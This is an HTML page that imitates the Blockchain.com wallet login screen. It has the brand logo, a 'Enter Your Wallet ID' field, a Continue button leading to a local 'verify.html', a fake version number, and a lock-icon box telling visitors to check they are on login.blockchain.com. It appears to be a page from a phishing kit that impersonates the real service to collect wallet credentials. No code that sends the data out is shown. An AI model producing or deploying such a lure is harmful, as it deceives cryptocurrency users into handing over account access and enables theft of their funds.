<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blockchain.com Wallet - Exchange </title>

    <!-- Custom Css -->
    <link rel="stylesheet" href="./css/style.css">

    <!-- Bootstrap Css -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">

    <!-- Bootstrap Js -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p"
        crossorigin="anonymous"></script>

</head>

<body>

    <section class="FirstSection">
        <div class="container">
            <div class="row">
                <div class="col-11 col-sm-10 col-md-8 col-lg-6 mx-auto FirstSection__col__1">
                    <img src="./img/bc_logo.svg" class="img-fluid" alt="logo">
                </div>
            </div>

            <div class="row">
                <div class="col-11 col-sm-10 col-md-8 col-lg-6 mx-auto FirstSection__col__2">
                    <h1>Welcome back!</h1>
                    <h3>Enter Your Wallet ID</h3>
                </div>
            </div>

            <div class="row">
                <div class="col-11 col-sm-10 col-md-8 col-lg-4 mx-auto FirstSection__col__3">
                    <form action="#">
                        <div class="form__items">
                            <div class="form__items_inner">
                                <label for="email">Wallet ID</label>
                                <span class="span__hidden">Required</span>
                            </div>
                            <input type="text" name="email" placeholder="Enter your wallet id">
                        </div>

                        <div class="form__items formBtn">
                            <button type="submit"><a href="./verify.html" style="color: #fff;">Continue</a></button>
                        </div>

                        <a href="#">Need Some Help?</a>
                    </form>
                </div>
            </div>

            <div class="row">
                <div class="col-11 col-sm-10 col-md-8 col-lg-6 mx-auto FirstSection__col__4">
                    <h5>
                        Please check that you are visiting the correct URL
                    </h5>
                    <div class="innerBluredBox">
                        <ion-icon name="lock-closed-outline" class="LockIcon"></ion-icon>
                        <a href="https://login.blockchain.com">https://login.blockchain.com</a>
                    </div>
                </div>
            </div>

            <div class="row">
                <div class="col-11 col-sm-10 col-md-8 col-lg-4 mx-auto FirstSection__col__5">
                    <p>English <ion-icon name="chevron-down-outline"></ion-icon>
                    </p>
                    <p>Version 4.55.7</p>
                    <p><a href="#">Need Help</a></p>
                </div>
            </div>

        </div>
    </section>





    <!-- IONICON -->
    <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
    <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>

    <!-- Custom Js -->
    <script src="./js/script.js"></script>
</body>

</html>
